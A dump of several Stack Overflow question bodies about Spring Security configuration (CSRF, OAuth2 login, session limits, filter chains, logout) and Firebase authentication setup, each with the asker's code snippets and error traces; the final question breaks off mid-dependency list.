<p><a href=""https://i.stack.imgur.com/b8ZiO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/b8ZiO.png"" alt=""enter image description here"" /></a></p>
<p>When CSRF (Cross-site request forgery) protection (http.csrf().disable(); in WebSecurityConfigurer) is disabled, both buttons work fine, but as soon as I Enable CSRF protection (by commenting out the line http.csrf().disable(); ) the simple mode button stops working.
Application is built with Maven and JSF 2.3.14, Spring 5.3.27 and Primefaces 12.0.0 frameworks.</p>
<p>screenshot.
<a href=""https://i.stack.imgur.com/b9oHJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/b9oHJ.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/LnLIb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LnLIb.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/fMT1P.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/fMT1P.png"" alt=""enter image description here"" /></a></p>
<p>I tried to use JSF upload button, it is working fine but the designed is not aligned with Primefaces simple mode button and I'm not able to modify it.</p>
"
"<p>With my security config looking something like this (and working fine):</p>
<pre><code>    ...
    .and()
        .oauth2Login()
            .loginPage(&quot;/login&quot;)
            .clientRegistrationRepository(clientRegistrationRepository())
            .authorizedClientService(authorizedClientService())
            .successHandler(successFunction())
            .failureHandler(failureFunction())
    .and()
    ...
</code></pre>
<p>how would I go about taking the result of a database call (to my own database) which might indicate that the user should in fact not be able to access?</p>
<p>I am hoping to be able to somehow hook into the Filterchain, do my calls and then &quot;land&quot; inside the success-/faulureFunction</p>
<p>Which Filter would be the appropriate one, where to add it in the chain and how to cause success/failure?</p>
<p>I tried reading up on it but maybe I can't find the right words to get the right results.</p>
"
"<p>I've got two entites - User and Manager.</p>
<p><strong>MANAGER</strong></p>
<pre><code>public class Manager extends BaseEntity implements UserDetails {

    private String email;
    private String password;

    private String firstName;
    private String lastName;

    private String position;
    private String avatar;

    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
            name = &quot;manager_authorities&quot;,
            joinColumns = @JoinColumn(name = &quot;manager_id&quot;),
            inverseJoinColumns = @JoinColumn(name = &quot;authority_id&quot;))
    private List&lt;Authority&gt; authorities;

    private boolean isEnabled;

    @Enumerated(EnumType.STRING)
    private AdminType adminType;

    @OneToMany(mappedBy = &quot;manager&quot;)
    private List&lt;EventRequest&gt; eventRequests;

    @Override
    public String getUsername() {
        return email;
    }

    @Override
    public boolean isAccountNonExpired()
    {
        return true;
    }

    @Override
    public boolean isAccountNonLocked()
    {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired()
    {
        return true;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        Manager manager = (Manager) o;
        return Objects.equals(email, manager.email) &amp;&amp; Objects.equals(password, manager.password);
    }

    @Override
    public int hashCode() {
        return Objects.hash(email, password);}
</code></pre>
<p><strong>USER</strong></p>
<pre><code>@Entity
@Builder
@Getter @Setter
@NoArgsConstructor
@AllArgsConstructor
@Table(name = &quot;users&quot;)
public class User extends BaseEntity implements UserDetails {

    private String email;
    private String password;

    private String firstName;
    private String lastName;

    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
            name = &quot;user_authorities&quot;,
            joinColumns = @JoinColumn(name = &quot;user_id&quot;),
            inverseJoinColumns = @JoinColumn(name = &quot;authority_id&quot;))
    private List&lt;Authority&gt; authorities;

    private boolean isEnabled;

    @Enumerated(EnumType.STRING)
    private UserType userType;

    @Override
    public String getUsername() {
        return email;
    }

    @Override
    public boolean isAccountNonExpired()
    {
        return true;
    }

    @Override
    public boolean isAccountNonLocked()
    {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired()
    {
        return true;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        User user = (User) o;
        return Objects.equals(email, user.email) &amp;&amp; Objects.equals(password, user.password);
    }

    @Override
    public int hashCode() {
        return Objects.hash(email, password);
    }
}
</code></pre>
<p>Now i don't know to differ them from each other, because they both go throught the same authentication method:</p>
<pre><code>
@Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();

        try {
            UserDetails userDetails = userService.loadUserByUsername(username);

            if (userDetails != null) {
                if (userDetails instanceof Manager) { //this condition always gives false
                    Manager manager = (Manager) userDetails;
                    if (manager.getEmail().equals(username) &amp;&amp; encoder.matches(password, manager.getPassword())) {
                        return new UsernamePasswordAuthenticationToken(manager, null, manager.getAuthorities());
                    }
                } else {
                    User user = (User) userDetails;
                    if (user.getEmail().equals(username) &amp;&amp; user.getPassword().equals(password)) {
                        return new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
                    }
                }
            }
        } catch (Exception e) {
            throw new UsernameNotFoundException(&quot;Пользователь с именем пользователя &quot; + username + &quot; не найден&quot;, e);
        }
        return null;
    }
</code></pre>
<p><em><strong>Both of their interfaces implement UserDetailsService</strong></em></p>
<p>}</p>
<p>I tried to get instanceof of class, but IDEA tells that these conditions always gives false value.
I don't know what should i get from credetials to diifer them</p>
"
"<p>I have been struggling with database security rules for a while. Especially with auth manipulation, such as <code>&quot;.write&quot;: &quot;auth.uid === $uid&quot;</code>.</p>
<p>I realized today that Firebase SDK will only log the user within the default app's RTDB and, therefore, will not send authentication during other database exchanges.
Did I miss something during the authentication process for multiple databases?</p>
<p>Here are the firebase configuration :</p>
<pre><code>firebaseConfig: {
    apiKey: &quot;xxx&quot;,
    appId: &quot;xxx&quot;
    authDomain: &quot;xxx&quot;,
    databaseURL: &quot;https://my-default-rtdb.europe-west1.firebasedatabase.app/&quot;,
    projectId: &quot;xxx&quot;,
    storageBucket: &quot;xxx&quot;,
    ...
  },
  firebaseAnotherConfig: {
    databaseURL: &quot;https://another-rtdb-instance.europe-west1.firebasedatabase.app/&quot;,
    storageBucket: &quot;xxx&quot;, // same as firebaseConfig
  },
  firebaseThelastConfig: {
    databaseURL: &quot;https://the-last-rtdb-instance.europe-west1.firebasedatabase.app/&quot;,
    storageBucket: &quot;xxx&quot;, // same as firebaseConfig
  }
</code></pre>
<p>Here the initializations</p>
<pre><code>    initializeApp(firebaseConfig);
    initializeApp(firebaseAnotherConfig, 'another');
    initializeApp(firebaseThelastConfig, 'thelast');
</code></pre>
<p>Then the auth management works through getAuh() function, so within the default app from &quot;firebaseConfig&quot;.</p>
<p>All apps are initialized before auth.
All data exchanges are working fine with all databases.</p>
<p>Tests in google console are working fine in all databases.
But, for know, rtdb rules &quot;auth.uid !== null&quot; only works live with the default rtdb.</p>
<p>I noticed the following function in firebase/app retrieving all apps: &quot;getApps()&quot;. But I couldn't make it work with Firebase &quot;signin..&quot; functions.</p>
"
"<p>when click logout it will redirect to login page but when i click twice browser back button im getting redirected to dashboard . this happen when i click twice only
below is my securityconfig code</p>
<pre><code>
@Configuration
@EnableWebSecurity
public class  SecurityConfig{

    private BCryptPasswordEncoder bCryptPasswordEncoder;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity httpSecurity) throws Exception{
        httpSecurity
        .authorizeHttpRequests(auth-&gt;{
          auth.requestMatchers(&quot;/login&quot;).permitAll()
                  .requestMatchers(&quot;/errorpage&quot;).permitAll()
                  .requestMatchers(&quot;/dashboard&quot;).permitAll()
                  .requestMatchers(&quot;/createadmin&quot;).permitAll()
                  .requestMatchers(&quot;/employee/**&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/module/**&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/user&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/designation/**&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/privilege&quot;).hasAnyAuthority(&quot;Admin&quot;)
                  .requestMatchers(&quot;/salesdrug&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/purchasedrug&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/category&quot;).hasAnyAuthority(&quot;Admin&quot;,&quot;Manager&quot;)
                  .requestMatchers(&quot;/resources/**&quot;).permitAll()

                  .anyRequest().authenticated();
        })
          .formLogin(login-&gt;{
                  login.loginPage(&quot;/login&quot;)
                       .defaultSuccessUrl(&quot;/dashboard&quot; , true)
                          .failureUrl(&quot;/login?error=usernamepassworderror&quot;)
                          .usernameParameter(&quot;username&quot;)
                          .passwordParameter(&quot;password&quot;);
          })
            .logout(logout-&gt;{
                    logout
                            .clearAuthentication(true) // Clear credentials
                            .invalidateHttpSession(true) // Invalidate session
                            .logoutUrl(&quot;/logout&quot;)
                            .logoutSuccessUrl(&quot;/login&quot;)
                            .deleteCookies(&quot;JSESSIONID&quot;);




            })
                .exceptionHandling(exception-&gt;{
                    exception.accessDeniedPage(&quot;/errorpage&quot;);
                })
                .csrf(csrf-&gt;{
                    csrf.disable();
                });
        return httpSecurity.build();
    }

    @Bean
    public BCryptPasswordEncoder bCryptPasswordEncoder(){
        bCryptPasswordEncoder=new BCryptPasswordEncoder();
        return bCryptPasswordEncoder;
    }

}

</code></pre>
<p>an this is my javascript code to get user confirmation</p>
<pre><code>
const logoutconfirm=()=&gt;{
    Swal.fire({
        title: &quot;Are you sure to logout&quot;,

        icon: &quot;warning&quot;,
        showCancelButton: true,
        confirmButtonColor: &quot;#3085d6&quot;,
        cancelButtonColor: &quot;#d33&quot;,
        confirmButtonText: &quot;Confirm&quot;
    }).then((result) =&gt; {
        if (result.isConfirmed) {
            // window.location.href = &quot;http://localhost:8080/logout&quot;;
            const form = document.createElement(&quot;form&quot;);
            form.method = &quot;POST&quot;;
            form.action = &quot;/logout&quot;;
            document.body.appendChild(form);
            form.submit();
        }
        else{
            Swal.fire({
                icon: &quot;error&quot;,
                title: &quot;Action Aborted&quot;


            });
        }
    });
}


</code></pre>
<p>what is the reason for that happening and i coudnt find a solution for this in internet</p>
"
"<p>I am using Keycloak version 22, Springboot 3.1
I would like to intercept the Keycloak URL before the request reach Keycloak.
Anyone has an example on how to do that using OAuth2AuthorizationRequestRedirectFilter ?
Any help please.
Thanks</p>
"
"<p>Hi I am learning Spring but when i felt starting convenient working with it, of course I came to a problem again... But this time I couldn't find any explanation even after hours of searching.</p>
<p><strong>Problem</strong>
When doing a Post request I get a 401. If I do the get request everything works fine.
I created multiple Post request with and without Requestbody but allways the same problem. Also if I disable the authentication by using : <code>.requestMatchers(&quot;/api&quot;).permitAll()</code> I still get a 401 for the POST Request.</p>
<p>First I thougth about cors but first of all I am using postman and second of all Post without json shouldn't be a problem. usually.</p>
<p><strong>Reproduce Problem</strong></p>
<p>I created the following minimal project to reproduce the problem:</p>
<p><strong>Spring Security Configuration</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .authorizeHttpRequests((authorize) -&gt; authorize
                        .anyRequest().authenticated()
                )
                .httpBasic(Customizer.withDefaults());

        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails userDetails = User.withDefaultPasswordEncoder()
                .username(&quot;user&quot;)
                .password(&quot;password&quot;)
                .roles(&quot;USER&quot;)
                .build();

        return new InMemoryUserDetailsManager(userDetails);
    }

}
</code></pre>
<p><strong>Spring Controller</strong></p>
<pre><code>@RestController
@RequestMapping(&quot;/api&quot;)
public class MainController {

    @GetMapping
    public String helloGet() {
        return &quot;Hello from Get&quot;;
    }

    @PostMapping
    public String helloPost() {
        return &quot;Hello from Post&quot;;
    }


}
</code></pre>
"
"<p>Environment:
Spring Boot: 3.2.2.<br />
Spring Security: 6.2.1</p>
<p>I'm currently using a custom filter to support JSON formatted data in requests. I also want to use <code>maximumSessions</code> to limit user that can only login in a browser at the same time.</p>
<p>I learned from an article on the internet that it seems necessary to set <code>ConcurrentSessionControlAuthenticationStrategy</code> in the custom filter bean. Here is my config code</p>
<pre><code>    @Bean
    public LoginFilter loginFilter(AuthenticationManager authenticationManager) throws Exception {
        LoginFilter loginFilter = new LoginFilter();
        loginFilter.setFilterProcessesUrl(&quot;/doLogin&quot;);
        loginFilter.setAuthenticationManager(authenticationManager);
        loginFilter.setSecurityContextRepository(new DelegatingSecurityContextRepository(
                new RequestAttributeSecurityContextRepository(),
                new HttpSessionSecurityContextRepository()
        ));
        loginFilter.setAuthenticationSuccessHandler((request, response, authentication) -&gt; {
            ...
        });
        loginFilter.setAuthenticationFailureHandler((request, response, exception) -&gt; {
            ...
        });

        ConcurrentSessionControlAuthenticationStrategy strategy = new ConcurrentSessionControlAuthenticationStrategy(sessionRegistry());
        strategy.setMaximumSessions(1);
        loginFilter.setSessionAuthenticationStrategy(strategy);

        return loginFilter;
    }


    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }

    @Bean
    public HttpSessionEventPublisher httpSessionEventPublisher() {
        return new HttpSessionEventPublisher();
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity, LoginFilter loginFilter) throws Exception {
        httpSecurity
                .sessionManagement(session -&gt; session.maximumSessions(1).maxSessionsPreventsLogin(true))
                .addFilterAt(new ConcurrentSessionFilter(sessionRegistry(), event -&gt; {
                    HttpServletResponse resp = event.getResponse();
                    resp.setContentType(&quot;application/json;charset=utf-8&quot;);
                    resp.setStatus(401);
                    PrintWriter out = resp.getWriter();
                    out.write(&quot;Already logged in on another device.&quot;);
                    out.flush();
                    out.close();
                }), ConcurrentSessionFilter.class)
                .addFilterAt(loginFilter, UsernamePasswordAuthenticationFilter.class)
                .authorizeHttpRequests(
                        requests -&gt; requests
                                .requestMatchers(&quot;/css/**&quot;, &quot;/js/**&quot;, &quot;/images/**&quot;, &quot;/getVerifyCode&quot;).permitAll()
                                .requestMatchers(&quot;/error&quot;).permitAll()
                                .anyRequest().authenticated()
                )              
                .logout(logout -&gt; logout.logoutUrl(&quot;/doLogout&quot;)
                        .logoutSuccessHandler((request, response, authentication) -&gt; {
                            ...
                        })
                )
                .csrf(csrfConfigurer -&gt; csrfConfigurer.disable())
                .exceptionHandling(exceptionHandler -&gt; exceptionHandler.authenticationEntryPoint((request, response, authException) -&gt; {
                    log.error(authException);                  
                }));


        return httpSecurity.build();
    }


</code></pre>
<p>And Here is the code of <code>LoginFilter</code></p>
<pre><code>@Log4j2
public class LoginFilter extends UsernamePasswordAuthenticationFilter {
    private final ObjectMapper objectMapper;
    private SessionRegistry sessionRegistry;

    public LoginFilter() {
        super();
        objectMapper = new ObjectMapper();
    }

    @Autowired
    public void setSessionRegistry(SessionRegistry sessionRegistry) {
        this.sessionRegistry = sessionRegistry;
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
        if (!request.getMethod().equals(&quot;POST&quot;)) {
            throw new AuthenticationServiceException(&quot;Authentication method not supported: &quot; + request.getMethod());
        }

        String verifyCode = (String) request.getSession().getAttribute(&quot;verify_code&quot;);
        Map&lt;String, String&gt; requestParameters = new HashMap&lt;&gt;();
        if (MediaType.APPLICATION_JSON_VALUE.equals(request.getContentType())) {
            requestParameters = extractRequestParametersFromJson(request);
        } else {
            requestParameters = extractRequestParametersFromForm(request);
        }

        String code = requestParameters.get(&quot;code&quot;);
        checkoutVerifyCode(code, verifyCode);

        String username = requestParameters.get(getUsernameParameter());
        String password = requestParameters.get(getPasswordParameter());

        username = username != null ? username.trim() : &quot;&quot;;
        password = password != null ? password : &quot;&quot;;
        UsernamePasswordAuthenticationToken authRequest = UsernamePasswordAuthenticationToken.unauthenticated(username, password);
        this.setDetails(request, authRequest);

        sessionRegistry.registerNewSession(request.getSession().getId(), authRequest.getPrincipal());
        return this.getAuthenticationManager().authenticate(authRequest);
    }
}

</code></pre>
<p>I'm new in Spring Security so I'm not sure if the configuration is incorrect or if there are missing parts.<br />
If someone could point out the issue, I would greatly appreciate it.</p>
<p><strong>Update</strong></p>
<p>I read the source code and realized that when a user logs in, <code>ConcurrentSessionControlAuthenticationStrategy#onAuthentication</code> will be called, and inside this method is <code>SessionRegistryImpl#getAllSessions</code>. Inside this method, it will call the <code>this.principals.get(principal)</code> method, where <code>principals</code> is a <code>ConcurrentMap&lt;Object, Set&lt;String&gt;&gt;</code> and <code>principal</code> is an <code>Object</code> used as the map's key.</p>
<p>The <code>principal</code> actually is my custom <code>User</code> class and has overridden <code>equals()</code> and <code>hashCode()</code>. However, the strange thing is that when I set a breakpoint on <code>equals()</code>, it shows that the parameter of <code>equals()</code> is a <code>String</code> object. I am confused as to why the <code>Map</code> uses the <code>User</code> object as a key but there is a <code>String</code> object in <code>equals()</code>.</p>
<p>This strange situation only happens when I use my custom filter which extends <code>UsernamePasswordAuthenticationFilter</code>. If I use the default <code>HttpSecurity#formLogin</code> and set the <code>sessionManagement</code>, it works normally.</p>
<p>When using <code>HttpSecurity#formLogin</code>, the parameter of <code>equals()</code> shows the type is <code>User</code>. I would like to know what causes the difference from <code>HttpSecurity#formLogin</code> and my costom filter.</p>
"
"<p>I have a Spring Boot application with Spring Security and multiple child web context.
I want to have a general <code>SecurityFilterChain</code> in the parent context, and a dedicated, more specialized <code>SecurityFilterChain</code> in the child context, that is only applied to requests concerning the child context.</p>
<p>A minimal example has these classes:</p>
<p><em>SpringMultipleSecurityApplication.java</em></p>
<pre><code>@SpringBootApplication
@EnableWebSecurity
@EnableWebMvc
public class SpringMultipleSecurityApplication {
    public static void main(String[] args) {
        SpringApplication.run(SpringMultipleSecurityApplication.class, args);
    }
}
</code></pre>
<p><em>ParentConfig</em></p>
<pre><code>@Configuration
@EnableWebMvc
@EnableWebSecurity
public class ParentConfig extends AbstractSecurityWebApplicationInitializer {
    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .securityMatcher(&quot;/parent/**&quot;)
                .authorizeHttpRequests(auth -&gt; auth.anyRequest().permitAll());
        return http.build();
    }

    @Bean
    ServletRegistrationBean&lt;DispatcherServlet&gt; childServlet(ServletContext context) {
        String regionConnectorName = &quot;MyChild&quot;;
        AnnotationConfigWebApplicationContext applicationContext = new AnnotationConfigWebApplicationContext();
        applicationContext.setId(regionConnectorName);
        applicationContext.register(ChildConfig.class);
        applicationContext.setServletContext(context);
        DispatcherServlet dispatcherServlet = new DispatcherServlet(applicationContext);

        ServletRegistrationBean&lt;DispatcherServlet&gt; connectorServletBean = new ServletRegistrationBean&lt;&gt;(dispatcherServlet, &quot;/foo/*&quot;);
        connectorServletBean.setName(regionConnectorName);
        connectorServletBean.setLoadOnStartup(1);

        return connectorServletBean;
    }
}
</code></pre>
<p><em>ParentController</em></p>
<pre><code>@RestController
public class ParentController {
    @GetMapping(&quot;/parent/foo&quot;)
    public String lib() {
        return &quot;This is /parent/foo&quot;;
    }
}
</code></pre>
<p><em>ChildConfig</em></p>
<pre><code>@Configuration
@EnableWebMvc
@EnableWebSecurity
@SpringBootApplication
public class ChildConfig {
    @Bean
    @Order(1)
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .securityMatcher(new AntPathRequestMatcher(&quot;/foo/child/**&quot;))
                .authorizeHttpRequests(auth -&gt; auth.anyRequest().permitAll());
        return http.build();
    }
}
</code></pre>
<p><em>ChildController</em></p>
<pre><code>@RestController
public class ChildController {
    @GetMapping(&quot;/child/hello&quot;)
    public String hello() {
        return &quot;Hello from child&quot;;
    }
}
</code></pre>
<p>These are just minimal configurations, I intend to configure e.g. an oauth2Login in the <em>ChildConfig's SecurityFilterChain.</em></p>
<p>When starting the application I see that both filter chains are registered:</p>
<pre><code>DefaultSecurityFilterChain     : Will secure Or [Mvc [pattern='/parent/**']] with [...
DefaultSecurityFilterChain     : Will secure Ant [pattern='/foo/child/**'] with [...
</code></pre>
<p>However, when making a request <em>to /foo/child/hello</em> the log output shows that the chain from the child context is not called:</p>
<pre><code>FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Or [Mvc [pattern='/parent/**']]...
FilterChainProxy        : No security for GET /foo/child/hello
</code></pre>
<p>A request to <em>/parent/foo</em> results in the filter chain being executed.</p>
<p>How can I configure a <code>SecurityFilterChain</code> in a child context, and make sure that it is applied to requests that should be handled by the child <code>DispatcherServlet</code> (i.e. <em>/foo</em> in the example).<br />
Is it even possible to configure a filter chain in a child context or do all the security filter chains have to be registered in the parent?</p>
<p>I tried having multiple <code>SecurityFilterChain</code> in the parent, and it works, however, my security chain in the child context is more complex and depends on some beans of the child context, so I don't want to put the whole config into the parent.</p>
<p>I manged to create a <code>Filter</code> Bean in the child context and register it in the parent so that it is called for requests by using a <code>DelegatingFilterProxy</code>. However, it's only possible to delegate to a <code>Filter</code> and not a <code>SecurityFilterChain</code>, which is what I need to be able to use e.g. oauth2Login on the <code>HttpSecurity</code> object.</p>
<p>The JavaDoc for <code>AbstractSecurityWebApplicationInitializer</code> mentions that one can override <code>getDispatcherWebApplicationContextSuffix</code> to return the name of a WebApplicationContext where the <code>DelegatingFilterProxy</code> should be searched, but I have not gotten this to work, the <code>getDispatcherWebApplicationContextSuffix</code> is never called.</p>
"
"<p>My Angular application is deployed to <em>localhost:4200</em> and Spring application is in <em>localhost:8080</em>. I am trying to implement OAuth2 security in purely REST style so entirely @RestController. All examples I saw requires returning a view which is discouraged.</p>
<p>Below is the intended flow :</p>
<p>1)My Angular button hits the :
http://localhost:8080/OAuthTrial/api/oauth-login</p>
<p>2)It should redirect to the Google Auth screen(I am trying to make Google work so I can translate to our custom OAuth server)</p>
<p>3)User authenticates and it hits back the callback endpoint in the Spring application and gets the &quot;code&quot;</p>
<p>4)The Spring application exchanges the &quot;code&quot; for access token and the access token for a JWT which it should send back to the Angular application</p>
<p>5)All the API endpoints must be secured with the JWT, which will be requested by the Angular application with the received JWT. The Spring application verifies  the JWT with the Auth server.</p>
<p>I have trying to make this work through Spring Security filter chain settings but wasn't able to. All examples involve returning a view. I am trying to not do that.</p>
<p>So my requirements are :</p>
<p>1)How to configure this in Spring Security. I tried doing this manually(making HTTPS requests to Google Auth server) and I get all the responses as expected but making the variables be available globally, Authentication setting etc. I see I have to do that manually also. So I figured I would use the standard implementation.</p>
<p>2)When I tried changing the Http &quot;Location&quot; header in my &quot;oauth-login&quot; endpoint, I getting the following error :</p>
<pre><code>Access to XMLHttpRequest at 'https://accounts.google.com/o/oauth2/v2/auth 
(redirected from 'http://localhost:8080/GoogleOpenId/api/login') from origin 'http://localhost:4200' 
has been blocked by CORS policy: 
No 'Access-Control-Allow-Origin' header is present on the requested resource.
</code></pre>
<p>Anyway to alleviate</p>
<p>3)Is this flow impossible. I am trying to avoid Implicit flow. And as I was informed Authorization Code with PKCE is not supported for SPA websites here.
So I trying to make this work with Authorization Code where my Spring application is the OAuth Client and also a Resource Server.</p>
<p>If the community could provide SecurityConfigs and any other configs and any relevant knowledge, it would be much appreciated.</p>
<p>Thanks in advance</p>
"
"<p>I'm a beginner trying to learn to use firebase auth with android compose</p>
<p>I'm following the code on <a href=""https://firebase.google.com/docs/auth/android/firebaseui"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/android/firebaseui</a> to create a signInLauncher but I'm getting the following error</p>
<p>I only selected email/password authentication on Firebase, no other providers</p>
<pre><code>java.lang.NoClassDefFoundError: Failed resolution of: Lcom/google/android/gms/auth/api/credentials/CredentialsOptions$Builder;at com.firebase.ui.auth.util.GoogleApiUtils.getCredentialsClient(GoogleApiUtils.java:29) 

at com.firebase.ui.auth.viewmodel.AuthViewModelBase.onCreate(AuthViewModelBase.java:30)
at com.firebase.ui.auth.viewmodel.ViewModelBase.init(ViewModelBase.java:24)
at com.firebase.ui.auth.KickoffActivity.onCreate(KickoffActivity.java:38)
at android.app.Activity.performCreate(Activity.java:8051)
at android.app.Activity.performCreate(Activity.java:8031)
at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1329)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3608)
at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3792)
at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:103)
at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)
at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)
at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2210)
at android.os.Handler.dispatchMessage(Handler.java:106)
at android.os.Looper.loopOnce(Looper.java:201)
at android.os.Looper.loop(Looper.java:288)
at android.app.ActivityThread.main(ActivityThread.java:7839)
at java.lang.reflect.Method.invoke(Native Method)
at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003)

Caused by: java.lang.ClassNotFoundException: Didn't find class &quot;com.google.android.gms.auth.api.credentials.CredentialsOptions$Builder&quot; on path: DexPathList[[dex file &quot;/data/data/com.mfhc.firebasetest/code_cache/.overlay/base.apk/classes3.dex&quot;, zip file &quot;/data/app/~~crZRGUM9m8NR4vzMFc5fFw==/com.mfhc.firebasetest-oesX28d7C_VTSFzoRDt6Gg==/base.apk&quot;],nativeLibraryDirectories=[/data/app/~~crZRGUM9m8NR4vzMFc5fFw==/com.mfhc.firebasetest-oesX28d7C_VTSFzoRDt6Gg==/lib/x86_64, /system/lib64, /system_ext/lib64]]

dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:218)
at java.lang.ClassLoader.loadClass(ClassLoader.java:379)
at java.lang.ClassLoader.loadClass(ClassLoader.java:312)
</code></pre>
<p>I followed the instructions on firebase to add the json file to my app folder and the appropriate dependencies. Is there something wrong with my gradle file?</p>
<pre><code>plugins {
    id(&quot;com.android.application&quot;)
    id(&quot;org.jetbrains.kotlin.android&quot;)
    id(&quot;com.google.gms.google-services&quot;)
}

dependencies {

    implementation(platform(&quot;com.google.firebase:firebase-bom:32.7.3&quot;))
    implementation(&quot;com.google.firebase:firebase-auth&quot;)
    implementation(&quot;com.firebaseui:firebase-ui-auth:8.0.2&quot;)
    implementation(&quot;com.google.android.gms:play-services-auth:21.0.0&quot;)


    implementation(&quot;androidx.core:core-ktx:1.12.0&quot;)
    implementation(&quot;androidx.lifecycle:lifecycle-runtime-ktx:2.7.0&quot;)
    implementation(&quot;androidx.activity:activity-compose:1.8.2&quot;)
    implementation(platform(&quot;androidx.compose:compose-bom:2023.08.00&quot;))
    implementation(&quot;androidx.compose.ui:ui&quot;)
    implementation(&quot;androidx.compose.ui:ui-graphics&quot;)
    implementation(&quot;androidx.compose.ui:ui-tooling-preview&quot;)
    implementation(&quot;androidx.compose.material3:material3&quot;)
    testImplementation(&quot;junit:junit:4.13.2&quot;)
    androidTestImplementation(&quot;androidx.test.ext:junit:1.1.5&quot;)
    androidTestImplementation(&quot;androidx.test.espresso:espresso-core:3.5.1&quot;)
    androidTestImplementation(platform(&quot;androidx.compose:compose-bom:2023.08.00&quot;))
    androidTestImplementation(&quot;androidx.compose.ui:ui-test-junit4&quot;)
    debugImplementation(&quot;androidx.compose.ui:ui-tooling&quot;)
    debugImplementation(&quot;androidx.compose.ui:ui-test-manifest&quot;)
}
</code></pre>
<pre><code>// Top-level build file where you can add configuration options common to all sub-projects/modules.
plugins {
    id(&quot;com.android.application&quot;) version &quot;8.2.2&quot; apply false
    id(&quot;org.jetbrains.kotlin.android&quot;) version &quot;1.9.22&quot; apply false
    id(&quot;com.google.gms.google-services&quot;) version &quot;4.4.1&quot; apply false
}
</code></pre>
<p>UPDATE:</p>
<p>Changing</p>
<p>implementation(&quot;com.google.android.gms:play-services-auth:21.0.0&quot;)</p>
<p>to</p>
<p>implementation(&quot;com.google.android.gms:play-services-auth:20.5.0&quot;)</p>
<p>fixed the error. does anyone know why?</p>
"
"<p>In my application, I have a security config which includes:</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    // some code
    http.authorizeHttpRequests(customiser -&gt; customiser
                    .shouldFilterAllDispatcherTypes(false)
                    .requestMatchers(&quot;/**&quot;)
                    .authenticated());
    // some code
    return http.build()

</code></pre>
<p>I need to specifically allow dispatcherTypes as I have a controller which returns <code>ResponseEntity&lt;StreamingResponseBody&gt;</code>. I assume that this means that DispatcherType.ASYNC needs to be allowed.</p>
<p>However, <code>.shouldFilterAllDispatcherTypes(false)</code> is deprecated for removal in spring-boot 3.2.2. The documentation suggests using <code>.dispatcherTypeMatchers(DispatcherType... type)</code> instead. However, when I attempt to introduce that method into my code, I am not able to specify <code>.requestMatchers()</code> in the method chain. I.e. this doesn't work:</p>
<pre class=""lang-java prettyprint-override""><code>            http.authorizeHttpRequests(customiser -&gt; customiser
                    .dispatcherTypeMatchers(DispatcherType.values())
                    .requestMatchers(&quot;/**&quot;) // &lt;-- the return value of dispatcherTypeMatchers doesn't have this method.
                    .authenticated());
</code></pre>
<p>How can I replace the code in the first block with something which isn't deprecated for removal?</p>
"
"<p>I've implemented phone authentication with Firebase, and I'm encountering an error stating &quot;Component auth has not been registered yet.&quot; in the live/production environment. Interestingly, everything functions flawlessly in the test/development setting. Despite using identical keys and setup for both environments, the issue persists exclusively in the live/production environment. I would appreciate any assistance or suggestions. Below are the details of the packages I'm using :</p>
<pre><code>&quot;dependencies&quot;: {
  &quot;@abacritt/angularx-social-login&quot;: &quot;^1.2.5&quot;,
  &quot;@angular/animations&quot;: &quot;^14.2.0&quot;,
